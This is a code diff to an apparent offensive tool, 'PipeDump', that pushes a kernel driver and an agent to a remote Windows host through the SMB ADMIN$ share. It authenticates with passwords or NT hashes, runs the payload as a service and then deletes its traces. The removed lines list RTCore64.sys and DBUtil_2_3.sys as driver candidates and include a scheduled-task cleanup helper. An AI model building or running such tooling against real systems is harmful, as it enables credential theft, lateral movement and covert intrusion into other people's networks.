@@ -232,11 +232,7 @@ class PipeDump:
     def _find_driver_binary(self) -> str | None:
         drivers_dir = os.path.join(os.path.dirname(os.path.dirname(
             os.path.dirname(__file__))), "agent", "drivers")
-        candidates = [
-            "KKYUM.sys", "signeddrv.sys",
-            "RTCore64.sys", "DBUtil_2_3.sys",
-            "rtcore64.sys", "dbutil_2_3.sys",
-        ]
+        candidates = ["KKYUM.sys"]
         for name in candidates:
             p = os.path.join(drivers_dir, name)
             if os.path.isfile(p):
@@ -351,14 +347,6 @@ class PipeDump:
         try:
             raw = self._read_output_file(output_name, timeout=300)
         except RuntimeError:
-            marker = self._try_read_file("Temp\\_svcrun.tmp")
-            if marker is not None:
-                print("    [dbg] service reached RUNNING (marker found)")
-            else:
-                print("    [dbg] service did NOT reach RUNNING")
-            tmp = self._try_read_file(f"Temp\\{output_name}.tmp")
-            if tmp:
-                print(f"    [dbg] .tmp exists ({len(tmp)} bytes)")
             raise
         finally:
             self._delete_service(svc_name)
@@ -379,7 +367,7 @@ class PipeDump:
                                          f"System32\\drivers\\{drv_remote_name}")
             except Exception:
                 pass
-            for name in (agent_name, "_svcrun.tmp",
+            for name in (agent_name,
                          f"{output_name}.dat", f"{output_name}.tmp"):
                 try:
                     self.session.delete_file("ADMIN$", f"Temp\\{name}")
@@ -468,16 +456,6 @@ class PipeDump:
         except Exception:
             pass
 
-    def _cleanup_task(self, task_path: str) -> None:
-        try:
-            with self.session.open_pipe("atsvc") as pipe:
-                ts = TaskScheduler(pipe)
-                ts.bind(self.session.username, self.session.password,
-                        self.session.nt_hash)
-                ts.delete_task(task_path)
-        except Exception:
-            pass
-
     def _write_remote_driver(self, filename: str, data: bytes) -> None:
         from smbprotocol.open import (
             Open, CreateDisposition, CreateOptions,
@@ -486,29 +464,6 @@ class PipeDump:
         )
         tree = self.session.tree_connect("ADMIN$")
         fh = Open(tree, f"System32\\drivers\\{filename}")
-        fh.create(
-            impersonation_level=ImpersonationLevel.Impersonation,
-            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
-            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
-            share_access=0,
-            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
-            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
-        )
-        offset = 0
-        while offset < len(data):
-            chunk = data[offset:offset + 65536]
-            fh.write(chunk, offset)
-            offset += len(chunk)
-        fh.close(get_attributes=False)
-
-    def _write_remote_file(self, filename: str, data: bytes) -> None:
-        from smbprotocol.open import (
-            Open, CreateDisposition, CreateOptions,
-            FileAttributes, FilePipePrinterAccessMask,
-            ImpersonationLevel,
-        )
-        tree = self.session.tree_connect("ADMIN$")
-        fh = Open(tree, f"Temp\\{filename}")
         fh.create(
             impersonation_level=ImpersonationLevel.Impersonation,
             desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
